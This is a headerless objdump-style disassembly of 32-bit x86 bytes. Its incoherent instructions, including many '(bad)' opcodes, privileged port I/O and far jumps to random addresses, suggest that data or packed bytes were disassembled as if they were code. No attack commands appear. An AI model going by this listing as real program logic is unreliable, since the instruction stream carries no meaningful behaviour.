  41ac0d:	sub    eax,0x7b54481b
  41ac12:	shl    DWORD PTR [ecx+0x1e],1
  41ac15:	mov    al,ds:0x9239c09c
  41ac1a:	or     dl,BYTE PTR [ecx-0x38]
  41ac1d:	in     al,dx
  41ac1e:	(bad)  
  41ac1f:	and    esi,DWORD PTR [ecx]
  41ac21:	(bad)  
  41ac22:	cli    
  41ac23:	leave  
  41ac24:	nop
  41ac25:	fisttp DWORD PTR [ebx-0x70]
  41ac28:	fdivr  DWORD PTR [ebx+ecx*1-0x16fcd6fa]
  41ac2f:	mov    esi,0xbbc04b1e
  41ac34:	(bad)  
  41ac35:	or     eax,0xbf60354e
  41ac3a:	aaa    
  41ac3b:	dec    eax
  41ac3c:	int3   
  41ac3d:	cmp    eax,0xcca136e8
  41ac42:	jmp    0xfd6073e5
  41ac47:	or     DWORD PTR [ecx-0x63],esp
  41ac4a:	xor    al,0xde
  41ac4c:	xor    DWORD PTR [edi+0x6f32b85d],esi
  41ac52:	push   cs
  41ac53:	xor    DWORD PTR [ecx],ecx
  41ac55:	jge    0x41abf6
  41ac57:	add    eax,0x933c401d
  41ac5c:	xor    BYTE PTR [eax+0x17],cl
  41ac5f:	xchg   edx,eax
  41ac60:	xor    ch,BYTE PTR es:[edi]
  41ac63:	(bad)  
  41ac64:	out    0xee,al
  41ac66:	mov    ebx,0x7c802b7f
  41ac6b:	mov    esp,0x2cf7d620
  41ac70:	stc    
  41ac71:	push   ss
  41ac72:	cmp    DWORD PTR [eax],edi
  41ac74:	call   0x5e360e8f
  41ac79:	push   es
  41ac7a:	neg    dh
  41ac7c:	inc    ebx
  41ac7d:	out    0x22,eax
  41ac7f:	or     BYTE PTR [edx-0x1c064305],0xc5
  41ac86:	adc    eax,ebp
  41ac88:	addr16 leave 
  41ac8a:	push   ss
  41ac8b:	xor    BYTE PTR [edi+ebx*4],0xd6
  41ac8f:	loope  0x41ad03
  41ac91:	jnp    0x41ac89
  41ac93:	push   eax
  41ac94:	adc    al,0xab
  41ac96:	adc    BYTE PTR ds:0x833e8f7,0x68
  41ac9d:	aam    0x2c
  41ac9f:	adc    dl,dl
  41aca1:	call   0xa63f:0xdc9e684b
  41aca8:	jg     0x41ac65
  41acaa:	lock or DWORD PTR [ecx+0x355846ea],ebp
  41acb1:	in     al,dx
  41acb2:	or     bh,BYTE PTR ds:0x990ca619
  41acb8:	pop    ebp
  41acb9:	mov    WORD PTR [ebp+0x3e598395],ds
  41acbf:	mov    ds:0xf61f25f3,al
  41acc4:	and    BYTE PTR ds:0x512678b6,dh
  41acca:	(bad)  
  41accb:	jmp    0x31a4e91d
  41acd0:	mov    ecx,DWORD PTR [ebx]
  41acd2:	jl     0x41ac64
  41acd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acd5:	fldcw  WORD PTR [ebx]
  41acd7:	xor    al,0xba
  41acd9:	fdiv   QWORD PTR [ebx-0x2]
  41acdc:	dec    ecx
  41acdd:	fs mov esi,0x9dc4109f
  41ace3:	call   0xcd7a:0xf4bbcd2a
  41acea:	(bad)
  41acee:	rcl    ch,1
  41acf0:	add    al,BYTE PTR [edi+0x1d5465dc]
  41acf6:	cmp    edi,DWORD PTR [edi-0xc317fbc]
  41acfc:	mov    ch,0x7c
  41acfe:	mov    esp,0xa4a9a924
  41ad03:	(bad)  
  41ad04:	xchg   edx,eax
  41ad05:	lock rcl DWORD PTR [ecx],1
  41ad08:	lahf   
  41ad09:	ds std 
  41ad0b:	xor    al,0x39
  41ad0d:	add    edi,esp
  41ad0f:	test   DWORD PTR [ecx-0x4d],ebp
  41ad12:	int    0xd8
  41ad14:	test   al,0x4a
  41ad16:	cmp    ah,BYTE PTR [esi-0x2a]
  41ad19:	shl    bh,1
  41ad1b:	and    ah,BYTE PTR [edi+eiz*8]
  41ad1e:	push   ecx
  41ad1f:	push   0x46564f97
  41ad24:	shl    BYTE PTR [ebx+0x7e185b0b],1
  41ad2a:	push   es
  41ad2b:	icebp  
  41ad2c:	push   eax
  41ad2d:	inc    esi
  41ad2e:	inc    esp
  41ad2f:	jmp    0x41adad
  41ad31:	mov    DWORD PTR [esi-0x139cb762],esp
  41ad37:	lods   al,BYTE PTR ds:[esi]
  41ad38:	aam    0xf
  41ad3a:	jecxz  0x41ad7b
  41ad3c:	fs in  al,0x7f
  41ad3f:	dec    ecx
  41ad40:	or     eax,0xb4fd1d2f
  41ad45:	shl    ecx,1
  41ad47:	cmp    DWORD PTR [edx-0x6],ebp
  41ad4a:	repz imul esp,DWORD PTR [ebx+0x1f],0x6ff7f8bc
  41ad52:	cdq    
  41ad53:	adc    BYTE PTR ss:[ecx+0x8],ch
  41ad57:	or     bh,bl
  41ad59:	push   ds
  41ad5a:	bound  edi,QWORD PTR [esi]
  41ad5c:	xchg   edx,eax
  41ad5d:	sbb    al,0x23
  41ad5f:	push   esp
  41ad60:	fsub   st(0),st
  41ad62:	push   ss
  41ad63:	mov    ?,ebx
  41ad65:	mov    dl,0x49
  41ad67:	dec    ebp
  41ad68:	inc    edi
  41ad69:	mov    ebp,0x9b81fcd4
  41ad6e:	int    0xbc
  41ad70:	lahf   
  41ad71:	enter  0x14fb,0x13
  41ad75:	dec    ebx
  41ad76:	imul   edi,DWORD PTR [esi-0x2cf9aea0],0x29b503aa
  41ad80:	repz push ebp
  41ad82:	lock inc edi
  41ad84:	push   cs
  41ad85:	add    edx,DWORD PTR [eax-0x20]
  41ad88:	sub    DWORD PTR [eax],eax
  41ad8a:	retf   0x6d71
  41ad8d:	cmp    DWORD PTR [ecx+0x133d8288],ebp
  41ad93:	push   0x52c1e002
  41ad98:	aaa    
  41ad99:	data16 and dh,BYTE PTR [ecx-0x1ff6c500]
  41ada0:	ds mov ebp,0x69dd85eb
  41ada6:	je     0x41adda
  41ada8:	lahf   
  41ada9:	arpl   WORD PTR [edi-0x2cd23aab],di
  41adaf:	or     BYTE PTR ss:[edx+eiz*8-0x73730adf],ah
  41adb7:	iret   
  41adb8:	mov    eax,0xc555d3ef
  41adbd:	sti    
  41adbe:	xor    BYTE PTR [edx],bh
  41adc0:	(bad)  
  41adc1:	xchg   esi,eax
  41adc2:	push   ebp
  41adc3:	mov    ch,0x73
  41adc5:	push   esp
  41adc6:	jnp    0x41ad6e
  41adc8:	lock jmp 0x2160ada
  41adce:	clc    
  41adcf:	mov    cl,0x16
  41add1:	in     al,dx
  41add2:	sub    edi,DWORD PTR [esi-0x8cceee5]
  41add8:	mov    eax,0x2ee36c1c
  41addd:	inc    ebx
  41adde:	mov    dh,bl
  41ade0:	aad    0xe0
  41ade2:	cmp    DWORD PTR [ebp+0x2b],eax
  41ade5:	mov    ebp,ecx
  41ade7:	ror    esi,cl
  41ade9:	push   edx
  41adea:	push   ebp
  41adeb:	shl    BYTE PTR [ebx+0x1b44b3a3],cl
  41adf1:	daa    
  41adf2:	and    cl,BYTE PTR [esi]
  41adf4:	je     0x41addf
  41adf6:	mov    eax,0x865b79e0
  41adfb:	pop    eax
  41adfc:	loopne 0x41ad99
  41adfe:	cmp    DWORD PTR [ecx-0x40c7ad37],edi
  41ae04:	icebp  
  41ae05:	aad    0x7
  41ae07:	inc    esi
  41ae08:	in     eax,dx
  41ae09:	or     ebx,DWORD PTR [edi]
  41ae0b:	xchg   edi,eax
  41ae0c:	in     al,dx
  41ae0d:	shl    BYTE PTR [ecx-0x6a208cb4],cl
  41ae13:	rcl    BYTE PTR ds:0x25e00a2e,0x5c
  41ae1a:	inc    ebx
  41ae1b:	pushf  
  41ae1c:	add    edi,DWORD PTR [edx-0x6b]
  41ae1f:	ins    BYTE PTR es:[edi],dx
  41ae20:	cmp    DWORD PTR [si],0x10baefc0
  41ae27:	adc    esi,DWORD PTR [edx+0x61]
  41ae2a:	push   edx
  41ae2b:	jmp    0x32df:0x40e9e434
  41ae32:	mov    ebp,DWORD PTR ss:[ebx+0x1e5089a]
  41ae39:	call   0x7d3f0f32
  41ae3e:	or     dh,ah
  41ae40:	push   0x5b9a0777
  41ae45:	dec    ebx
  41ae46:	rol    BYTE PTR [ebp+0x4b],0xa9
  41ae4a:	(bad)  
  41ae4b:	int    0x3
  41ae4d:	repnz inc esi
  41ae4f:	call   0x1574a91e
  41ae54:	out    dx,al
  41ae55:	(bad)  
  41ae56:	sub    edi,esp
  41ae58:	pop    ebp
  41ae59:	mov    ah,0xab
  41ae5b:	stc    
  41ae5c:	jns    0x41aed3
  41ae5e:	and    edx,edx
  41ae60:	inc    esp
  41ae61:	aad    0xc
  41ae63:	test   al,0x99
  41ae65:	adc    dh,BYTE PTR [ecx+0x6d]
  41ae68:	popa   
  41ae69:	adc    al,0x85
  41ae6b:	xor    BYTE PTR [ecx+0x78],bh
  41ae6e:	xor    DWORD PTR [ebx+0x3e429dff],edi
  41ae74:	call   0xe4ef:0xc81abca1
  41ae7b:	pop    ss
  41ae7c:	lock popa 
  41ae7e:	mov    es,eax
  41ae80:	pop    ebp
  41ae81:	addr16 mov cs,eax
  41ae84:	(bad)
  41ae87:	outs   dx,BYTE PTR gs:[esi]
  41ae89:	(bad)  
  41ae8a:	xor    dh,BYTE PTR [edx+0x5f]
  41ae8d:	push   0x1c
  41ae8f:	out    dx,al
  41ae90:	lods   eax,DWORD PTR ds:[esi]
  41ae91:	mov    dh,0xf6
  41ae93:	stc    
  41ae94:	sbb    BYTE PTR [eax],dh
  41ae96:	ins    BYTE PTR es:[edi],dx
  41ae97:	repnz nop
  41ae99:	outs   dx,DWORD PTR ds:[esi]
  41ae9a:	sub    eax,0xe76baca1
  41ae9f:	sbb    cl,ah
  41aea1:	shl    ebp,1
  41aea3:	mov    eax,ds:0x7723f47e
  41aea8:	and    BYTE PTR [ebx-0x1d],bh
  41aeab:	mov    cl,0x68
  41aead:	lods   al,BYTE PTR ds:[esi]
  41aeae:	xchg   ebx,eax
  41aeaf:	pop    edx
  41aeb0:	jge    0x41ae84
  41aeb2:	repnz shl BYTE PTR cs:[esi-0x5da2f2c6],cl
  41aeba:	repnz add esp,DWORD PTR [ecx]
  41aebd:	std    
  41aebe:	pop    ds
  41aebf:	cs scas eax,DWORD PTR es:[edi]
  41aec1:	jne    0x41ae99
  41aec3:	data16 mov cl,0xa6
  41aec6:	mov    edx,0x61d0016b
  41aecb:	add    DWORD PTR [ebx+0x51],esp
  41aece:	mov    edx,0xd4aca7c9
  41aed3:	nop
  41aed4:	push   0xffffffa9
  41aed6:	mov    esi,0xa91ebffb
  41aedb:	ins    DWORD PTR es:[edi],dx
  41aedc:	leave  
  41aedd:	jnp    0x41ae87
  41aedf:	fwait
  41aee0:	mov    eax,0x87b1022b
  41aee5:	cmp    al,0x48
  41aee7:	repz dec edx
  41aee9:	fst    DWORD PTR [edi]
  41aeeb:	dec    eax
  41aeec:	icebp  
  41aeed:	sbb    BYTE PTR [edi+edx*4+0x59],bh
  41aef1:	sahf   
  41aef2:	sbb    esp,esi
  41aef4:	pushf  
  41aef5:	ret    
  41aef6:	push   edi
  41aef7:	int3   
  41aef8:	mov    al,ds:0xb7f465c5
  41aefd:	pushf  
  41aefe:	dec    edx
  41aeff:	mov    dl,0xf4
  41af01:	push   cs
  41af02:	xor    al,0x27
  41af04:	cmp    bh,ch
  41af06:	add    ebx,ebx
  41af08:	xor    eax,0x8e4d961e
  41af0d:	sbb    eax,0x8644a1fe
  41af12:	sub    ah,BYTE PTR [ecx-0x663e523a]
  41af18:	inc    ebx
  41af19:	inc    esi
  41af1a:	sbb    eax,0x5672eca0
  41af1f:	sbb    al,0x13
  41af21:	cmp    eax,0xfb937981
  41af26:	dec    eax
  41af27:	dec    edx
  41af28:	repz shl DWORD PTR [ebx+eiz*8+0x56],0xfc
  41af2e:	pop    ebp
  41af2f:	push   edx
  41af30:	popf   
  41af31:	retf   
  41af32:	fs popf 
  41af34:	xor    ebp,DWORD PTR [edx+0x7e]
  41af37:	ret    0x31aa
  41af3a:	sbb    edi,0x790acc50
  41af40:	aad    0xe9
  41af42:	cs inc esi
  41af44:	popw   ss
  41af46:	sbb    ecx,DWORD PTR [ecx+0x44]
  41af49:	jp     0x41afc8
  41af4b:	gs retf 0xc401
  41af4f:	and    al,0xae
  41af51:	xchg   esp,eax
  41af52:	int    0x15
  41af54:	add    edi,ebp
  41af56:	cmp    cl,dl
  41af58:	dec    esp
  41af59:	loopne 0x41af0f
  41af5b:	lea    eax,[esi+0x72feaf77]
  41af61:	adc    BYTE PTR [ecx+edx*4+0x31],dl
  41af65:	mov    ebp,0x4e712e92
  41af6a:	jo     0x41af83
  41af6c:	or     DWORD PTR [ebx],esp
  41af6e:	or     al,0x27
  41af70:	and    esi,DWORD PTR [ecx+0x42]
  41af73:	test   DWORD PTR [ecx+0x4b],esi
  41af76:	pop    ss
  41af77:	lock sbb DWORD PTR [edx],edi
  41af7a:	repz scas al,BYTE PTR es:[edi]
  41af7c:	lods   al,BYTE PTR ds:[esi]
  41af7d:	fs xchg edi,eax
  41af7f:	sub    eax,0xfb451efd
  41af84:	lods   al,BYTE PTR ds:[esi]
  41af85:	xlat   BYTE PTR ds:[ebx]
  41af86:	jp     0x41afe9
  41af88:	adc    ecx,edi
  41af8a:	jmp    0xfd7f:0xa96309d0
  41af91:	(bad)  
  41af92:	lods   al,BYTE PTR ds:[esi]
  41af93:	jo     0x41afe1
  41af95:	inc    eax
  41af96:	push   ss
  41af97:	pop    esi
  41af98:	push   cs
  41af99:	mov    bh,0x72
  41af9b:	retf   
  41af9c:	iret   
  41af9d:	cs mov ebp,0x51afc82f
  41afa3:	scas   eax,DWORD PTR es:[edi]
  41afa4:	and    BYTE PTR [ebx-0x70372055],0x3a
  41afab:	and    eax,0x68ca2003
  41afb0:	xor    DWORD PTR [edi+ecx*1+0x50],ebx
  41afb4:	in     al,dx
  41afb5:	aaa    
  41afb6:	iret   
  41afb7:	fimul  WORD PTR [eax]
  41afb9:	cmp    esi,DWORD PTR [ecx]
  41afbb:	out    dx,al
  41afbc:	lock pop ds
  41afbe:	lods   eax,DWORD PTR ds:[esi]
  41afbf:	add    eax,0x43e3fe1f
  41afc4:	mov    bl,cl
  41afc6:	dec    esi
  41afc7:	dec    ebx
  41afc8:	or     al,0x3a
  41afca:	or     al,0xcb
  41afcc:	mov    al,ds:0x68c935f7
  41afd1:	push   eax
  41afd2:	jno    0x41af75
  41afd4:	pop    eax
  41afd5:	add    al,0x3c
  41afd7:	or     bh,BYTE PTR [ecx+0x2e]
  41afda:	jp     0x41b03e
  41afdc:	int3   
  41afdd:	ds (bad) 
  41afdf:	cmp    al,BYTE PTR [edx]
  41afe1:	jle    0x41b03b
  41afe3:	(bad)  
  41afe4:	xchg   DWORD PTR [bp+si+0x15],ecx
  41afe8:	pop    ds
  41afe9:	mov    dl,0x5d
  41afeb:	sbb    al,0xa5
  41afed:	mov    al,ds:0xdd1677aa
  41aff2:	mov    ah,0x45
  41aff4:	leave  
  41aff5:	jne    0x41afbe
  41aff7:	in     eax,dx
  41aff8:	sbb    al,0x2c
  41affa:	setne  BYTE PTR [edx+0x64]
  41affe:	retf   0x7873
  41b001:	inc    esi
  41b002:	sbb    BYTE PTR [ebp-0x14b05924],dl
  41b008:	jle    0x41aff3
  41b00a:	lods   al,BYTE PTR ds:[esi]
  41b00b:	sar    DWORD PTR [ebp+0xf],0xc3
  41b00f:	jmp    0x41b054
  41b011:	sahf   
  41b012:	jecxz  0x41affa
  41b014:	inc    esi
  41b015:	rcr    dh,0x33
  41b018:	and    al,0x77
  41b01a:	js     0x41afbf
  41b01c:	sub    DWORD PTR [ebp-0x1c],esp
  41b01f:	jmp    0x7701a403
  41b024:	pop    ss
  41b025:	cmp    BYTE PTR [eax+0x1b],dh
  41b028:	and    ebp,DWORD PTR [ebx]
  41b02a:	mov    esp,0x59de87e6
  41b02f:	mov    ds:0x30f4effc,eax
  41b034:	dec    eax
  41b035:	and    DWORD PTR [edi+0x1d657ebf],ebp
  41b03b:	xchg   esi,eax
  41b03c:	sti    
  41b03d:	push   ebx
  41b03e:	std    
  41b03f:	cmp    BYTE PTR [ebp+0x5574d7c7],0x6
  41b046:	scas   eax,DWORD PTR es:[edi]
  41b047:	xchg   edi,eax
  41b048:	fwait
  41b049:	repnz sti 
  41b04b:	cmp    DWORD PTR [edi-0xd],ebx
  41b04e:	pop    ebx
  41b04f:	xor    BYTE PTR [edx],cl
  41b051:	popa   
  41b052:	ins    DWORD PTR es:[edi],dx
  41b053:	or     dl,BYTE PTR [eax]
  41b055:	push   ecx
  41b056:	mov    al,0xc
  41b058:	out    dx,al
  41b059:	mov    ebp,0x78191c18
  41b05e:	mov    cl,0xb8
  41b060:	cmp    eax,ebx
  41b062:	cmp    eax,0x1f4fbbc4
  41b067:	mov    ebx,0xbde42489
  41b06c:	imul   ebx,edi,0x41a86146
  41b072:	push   eax
  41b073:	in     eax,0xd0
  41b075:	push   0xffffffb8
  41b077:	jno    0x41b0cc
  41b079:	xchg   esi,eax
  41b07a:	xchg   BYTE PTR [edi+0x5e35d4f4],ch
  41b080:	cli    
  41b081:	out    0x62,eax
  41b083:	sti    
  41b084:	or     cl,BYTE PTR [edx]
  41b086:	and    al,BYTE PTR [eax-0x40]
  41b089:	mov    esi,0xfd2e83b6
  41b08e:	call   0x5936:0x87691108
  41b095:	add    bl,0xcb
  41b098:	(bad)  
  41b099:	dec    eax
  41b09a:	xor    dh,BYTE PTR [ecx-0x3c]
  41b09d:	xchg   BYTE PTR [eax+0x5e],dh
  41b0a0:	loop   0x41b082
  41b0a2:	outs   dx,DWORD PTR ds:[esi]
  41b0a3:	out    dx,eax
  41b0a4:	xchg   esi,eax
  41b0a5:	jge    0x41b0dd
  41b0a7:	push   ds
  41b0a8:	stos   BYTE PTR es:[edi],al
  41b0a9:	or     dl,BYTE PTR ds:0xe145126f
  41b0af:	mov    bl,0x32
  41b0b1:	or     BYTE PTR [edx-0x54],ah
  41b0b4:	call   0xeefaffc9
  41b0b9:	inc    esp
  41b0ba:	fidivr DWORD PTR [ebx-0x6c]
  41b0bd:	jns    0x41b127
  41b0bf:	repz jecxz 0x41b117
  41b0c2:	ror    BYTE PTR [ebx+0x1e99294d],0x82
  41b0c9:	xor    cl,ah
  41b0cb:	push   ebx
  41b0cc:	mov    esi,0xa5f1940
  41b0d1:	push   esi
  41b0d2:	push   ds
  41b0d3:	push   eax
  41b0d4:	std    
  41b0d5:	outs   dx,BYTE PTR ds:[esi]
  41b0d6:	and    BYTE PTR [edi],ah
  41b0d8:	fwait
  41b0d9:	jnp    0x41b0f4
  41b0db:	adc    al,0x71
  41b0dd:	ja     0x41b128
  41b0df:	fist   DWORD PTR [edi]
  41b0e1:	test   eax,esi
  41b0e3:	sbb    DWORD PTR [ebp-0x2b],eax
  41b0e6:	mov    al,0x1
  41b0e8:	(bad)  
  41b0e9:	sahf   
  41b0ea:	dec    esi
  41b0eb:	cmp    al,0x8d
  41b0ed:	jb     0x41b0cd
  41b0ef:	cmp    eax,0x4b4951fe
  41b0f4:	(bad)  
  41b0f5:	push   0x18fb2b8
  41b0fa:	pop    esp
  41b0fb:	ret    0xa0fe
  41b0fe:	sti    
  41b0ff:	jne    0x41b172
  41b101:	mov    ds:0xacee7950,eax
  41b106:	jbe    0x41b0cf
  41b108:	push   edx
  41b109:	fistp  QWORD PTR [ebx]
  41b10b:	(bad)  
  41b10c:	lock sbb ah,ah
  41b10f:	xchg   BYTE PTR [ebx+0x20092ab],bl
  41b115:	ja     0x41b121
  41b117:	lea    eax,[esi]
  41b119:	in     al,dx
  41b11a:	mov    BYTE PTR [esi+0x2bb4e3b9],al
  41b120:	test   bl,cl
  41b122:	fs pop ebp
  41b124:	cmc    
  41b125:	and    DWORD PTR ds:[ebx],edx
  41b128:	xchg   esi,eax
  41b129:	sahf   
  41b12a:	call   0xd2cb:0xe082aa50
  41b131:	jp     0x41b112
  41b133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b134:	sbb    ecx,DWORD PTR [ecx]
  41b136:	sub    al,0x45
  41b138:	dec    edx
  41b139:	(bad)  
  41b13a:	pop    ds
  41b13b:	pop    es
  41b13c:	push   edx
  41b13d:	cs pop ss
  41b13f:	sbb    eax,0xad457826
  41b144:	not    BYTE PTR [eax]
  41b146:	pushf  
  41b147:	sbb    ebx,esp
  41b149:	mov    eax,ds:0xf85cffd9
  41b14e:	lock jmp 0x222f550a
  41b154:	rcr    DWORD PTR [esi+ebp*1],0xb3
  41b158:	or     ecx,DWORD PTR [ecx]
  41b15a:	jns    0x41b16c
  41b15c:	cmp    al,0xfd
  41b15e:	test   DWORD PTR es:[edi],0x46dd4981
  41b165:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b166:	test   eax,0x9560e5c0
  41b16b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b16c:	or     esi,edi
  41b16e:	cli    
  41b16f:	enter  0x6604,0x19
  41b173:	popa   
  41b174:	jbe    0x41b1a1
  41b176:	jp     0x41b10f
  41b178:	push   0x61
  41b17a:	sub    ebp,edi
  41b17c:	scas   al,BYTE PTR es:[edi]
  41b17d:	(bad)  
  41b17e:	(bad)  
  41b17f:	cmp    dh,BYTE PTR [ebx]
  41b181:	inc    edi
  41b182:	push   ss
  41b183:	push   0x35b82248
  41b188:	arpl   WORD PTR [ecx],cx
  41b18a:	or     ebp,DWORD PTR ds:0x4cdf2296
  41b190:	daa    
  41b191:	(bad)  
  41b193:	and    eax,0x59a03f00
  41b198:	push   edx
  41b199:	dec    ebx
  41b19a:	ins    BYTE PTR es:[edi],dx
  41b19b:	pop    esi
  41b19c:	cmp    DWORD PTR [edi+0x754ecca0],0xffffffc5
  41b1a3:	das    
  41b1a4:	push   esi
  41b1a5:	iret   
  41b1a6:	aam    0xcc
  41b1a8:	and    BYTE PTR [ecx-0x1f9978c0],cl
  41b1ae:	scas   al,BYTE PTR es:[edi]
  41b1af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1b0:	adc    eax,0x279855ab
  41b1b5:	xchg   BYTE PTR [ebp+0x18],dl
  41b1b8:	xor    ebp,DWORD PTR [eax+0x127ad5b]
  41b1be:	xchg   edx,eax
  41b1bf:	aaa    
  41b1c0:	test   eax,0x1ff8c6c0
  41b1c5:	cmp    eax,edi
  41b1c7:	jo     0x41b205
  41b1c9:	ja     0x41b21c
  41b1cb:	sbb    al,0xb3
  41b1cd:	jae    0x41b16f
  41b1cf:	jns    0x41b1e9
  41b1d1:	lods   al,BYTE PTR ds:[esi]
  41b1d2:	outs   dx,DWORD PTR ds:[esi]
  41b1d3:	repz push esi
  41b1d5:	inc    edi
  41b1d6:	and    al,0xf2
  41b1d8:	inc    ebx
  41b1d9:	mov    DWORD PTR [edx-0x6f],ebp
  41b1dc:	dec    edi
  41b1dd:	fidiv  WORD PTR [ecx]
  41b1df:	cmp    DWORD PTR [ecx-0xe],edx
  41b1e2:	jp     0x41b244
  41b1e4:	aam    0xd1
  41b1e6:	sbb    al,0xf2
  41b1e8:	xor    ebx,DWORD PTR [edi+0x25]
  41b1eb:	pop    edx
  41b1ec:	cs int3 
  41b1ee:	sub    ah,dl
  41b1f0:	mov    edx,0x68956e7a
  41b1f5:	test   al,0x5a
  41b1f7:	cld    
  41b1f8:	dec    edi
  41b1f9:	in     eax,0x2e
  41b1fb:	xchg   edi,eax
  41b1fc:	or     al,0x85
  41b1fe:	test   bh,al
  41b200:	(bad)  
  41b201:	xchg   BYTE PTR [ecx],al
  41b203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b204:	call   DWORD PTR [ebx]
  41b206:	call   0x50dead58
  41b20b:	lea    ebx,[ebp+0x79]
  41b20e:	rol    BYTE PTR [esi-0x5],0xb9
  41b212:	stc    
  41b213:	and    al,BYTE PTR [ebp-0x49]
  41b216:	mov    bh,BYTE PTR [edi+0x38]
  41b219:	popa   
  41b21a:	stos   BYTE PTR es:[edi],al
  41b21b:	pop    ds
  41b21c:	push   edi
  41b21d:	jg     0x41b1af
  41b21f:	gs in  eax,dx
  41b221:	lea    edx,[edx-0x57c14dcc]
  41b227:	das    
  41b228:	mov    ecx,0x56f41001
  41b22d:	and    ecx,DWORD PTR [edx-0x58]
  41b230:	loop   0x41b209
  41b232:	mov    cl,BYTE PTR [edx+0x28]
  41b235:	jge    0x41b1c8
  41b237:	sub    al,0xb6
  41b239:	out    dx,eax
  41b23a:	stos   BYTE PTR es:[edi],al
  41b23b:	push   edi
  41b23c:	pop    edi
  41b23d:	sub    eax,0x981732e5
  41b242:	xor    BYTE PTR [ebx+0x408550c2],bh
  41b248:	repz mov eax,ds:0x8cbc896a
  41b24e:	shl    BYTE PTR [edx-0x8],cl
  41b251:	xchg   esp,eax
  41b252:	dec    esp
  41b253:	inc    eax
  41b254:	and    al,BYTE PTR [eax]
  41b256:	bnd jp 0x41b20d
  41b259:	cmp    eax,0x70fd9969
  41b25e:	add    ecx,ebx
  41b260:	fwait
  41b261:	add    BYTE PTR ds:0x20bd992,dh
  41b267:	mov    es,eax
  41b269:	fdiv   st,st(7)
  41b26b:	mov    ds:0x183284e8,eax
  41b270:	daa    
  41b271:	mov    bl,0xdf
  41b273:	bnd jmp 0x41b241
  41b276:	mov    edx,0x2ac6be83
  41b27b:	pop    edi
  41b27c:	std    
  41b27d:	lock pop edi
  41b27f:	aam    0x52
  41b281:	repz sub esi,DWORD PTR [ebx+ecx*1-0x2a]
  41b286:	sbb    al,0x5b
  41b288:	pusha  
  41b289:	jne    0x41b28a
  41b28b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b28c:	loope  0x41b264
  41b28e:	enter  0x72f5,0xa2
  41b292:	push   eax
  41b293:	inc    ecx
  41b294:	setnp  BYTE PTR [edx+0x77]
  41b298:	mov    WORD PTR [esi-0x5c],fs
  41b29b:	xor    eax,0xfa7c138d
  41b2a0:	scas   al,BYTE PTR es:[edi]
  41b2a1:	shl    DWORD PTR ds:0x99d54e7b,cl
  41b2a7:	pop    esp
  41b2a8:	fist   DWORD PTR [ecx]
  41b2aa:	xchg   ebx,eax
  41b2ab:	jl     0x41b2b2
  41b2ad:	es add cl,bh
  41b2b0:	in     eax,dx
  41b2b1:	add    edi,esi
  41b2b3:	xchg   esp,eax
  41b2b4:	and    cl,BYTE PTR [eax]
  41b2b6:	pop    ebp
  41b2b7:	mov    eax,0xfe97bb29
  41b2bc:	pop    ebp
  41b2bd:	popf   
  41b2be:	out    dx,eax
  41b2bf:	or     BYTE PTR [esi+eiz*2],0x26
  41b2c3:	or     DWORD PTR [eax-0x70],0x3d
  41b2c7:	lods   al,BYTE PTR ds:[esi]
  41b2c8:	sti    
  41b2c9:	or     DWORD PTR [edi-0x73],ecx
  41b2cc:	push   0xffffff9e
  41b2ce:	lods   al,BYTE PTR ds:[esi]
  41b2cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2d0:	add    DWORD PTR [edx],edx
  41b2d2:	and    BYTE PTR [ecx+esi*1-0x5a],ch
  41b2d6:	out    0x4b,al
  41b2d8:	adc    al,0x9f
  41b2da:	es out dx,eax
  41b2dc:	shl    DWORD PTR [ebx+0x22d9a67d],1
  41b2e2:	jb     0x41b2c1
  41b2e4:	or     BYTE PTR [edi-0x5071743c],bh
  41b2ea:	les    ebx,FWORD PTR [eiz*2+0x5ef04f3d]
  41b2f1:	jecxz  0x41b278
  41b2f3:	cmp    eax,0xe6446dc
  41b2f8:	mov    al,ds:0xe7ccd2a
  41b2fd:	(bad)  
  41b2fe:	fxch   st(7)
  41b300:	arpl   WORD PTR [ecx+eax*4],cx
  41b303:	stos   DWORD PTR es:[edi],eax
  41b304:	cmovae edx,DWORD PTR [esi+0x4851d93f]
  41b30b:	pop    esp
  41b30c:	lods   eax,DWORD PTR ds:[esi]
  41b30d:	ins    BYTE PTR es:[edi],dx
  41b30e:	jge    0x41b38f
  41b310:	rol    BYTE PTR [ebx-0x14],cl
  41b313:	sbb    BYTE PTR [edi+0x4a0526a4],dl
  41b319:	adc    eax,ebx
  41b31b:	inc    ebp
  41b31c:	jg     0x41b2c1
  41b31e:	add    ebx,ebx
  41b320:	push   0x9
  41b322:	fnstcw WORD PTR [ecx+0x48]
  41b325:	dec    edi
  41b326:	cdq    
  41b327:	les    esi,FWORD PTR [ebx+edi*4]
  41b32a:	hlt    
  41b32b:	(bad)  
  41b32c:	sbb    DWORD PTR [esi+ecx*1-0x20],esp
  41b330:	cmp    DWORD PTR [eax-0x3bb738d7],ebx
  41b336:	cmp    al,0xea
  41b338:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b339:	add    eax,0xc54ce429
  41b33e:	adc    al,0xc2
  41b340:	repz cmp ebp,DWORD PTR [ecx-0xdc8476]
  41b347:	cmc    
  41b348:	xchg   ebp,eax
  41b349:	xor    esi,eax
  41b34b:	and    al,0x5d
  41b34d:	mov    ds:0x98742067,al
  41b352:	push   0xa
  41b354:	shl    DWORD PTR [edx-0x556baa9d],0xd2
  41b35b:	xor    eax,0x7795d8ba
  41b360:	pop    edx
  41b361:	xor    edx,eax
  41b363:	retf   
  41b364:	or     DWORD PTR [ecx],esi
  41b366:	jmp    FWORD PTR [edi-0x7415eec9]
  41b36c:	add    eax,0xf75c882b
  41b371:	fisub  WORD PTR [edx+0x79]
  41b374:	jecxz  0x41b398
  41b376:	imul   ebx,DWORD PTR [esi+0x1b73c09a],0xffffffed
  41b37d:	sub    ebx,0xffffffe7
  41b380:	fmul   QWORD PTR [ebp-0x6473293c]
  41b386:	dec    ecx
  41b387:	ficomp DWORD PTR [edi+0x67]
  41b38a:	jo     0x41b358
  41b38c:	dec    edi
  41b38d:	xchg   BYTE PTR [eax-0x3eccfe4e],ah
  41b393:	cmp    al,0x55
